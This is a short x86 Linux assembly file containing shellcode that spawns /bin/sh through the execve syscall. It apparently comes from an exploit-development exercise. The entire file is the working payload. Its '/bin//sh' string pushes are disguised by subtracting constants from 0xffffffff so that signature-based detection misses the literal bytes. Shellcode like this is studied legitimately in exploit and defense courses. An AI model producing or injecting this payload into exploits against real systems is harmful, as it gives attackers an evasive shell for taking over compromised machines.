; shellcode to spawn a shell
;

global _start

section .text

_start:

xor     eax, eax    	; clear eax register
push    eax         	; push NULL termination char to end string(/bin//sh)

; push    0x68732f2f  	;Push //sh

; encode above push instruction
xor	ebx, ebx
mov	ebx, 0xffffffff
sub	ebx, 0x978cd0d0	; ebx now contains 0x68732f2f 
sub	esp, 0x4	; push ebx
mov	[esp], ebx

; push    0x6e69622f  ;Push /bin

; encode above push instruction
xor	ebx, ebx
mov	ebx, 0xffffffff
sub	ebx, 0x91969dd0	; ebx now contains 0x6e69622f
sub	esp, 0x4	; push ebx
mov	[esp], ebx

mov     ebx, esp    	; ebx now contains address of /bin//sh
push    eax         	; push NULL byte
mov     edx, esp    	; edx now contains address of NULL byte
push    ebx         	; push address of /bin//sh
mov     ecx, esp    	; ecx now contains address of address of /bin//sh bytes
mov     al, 11      	; execve syscall number is 11
int     0x80        	; make the system call
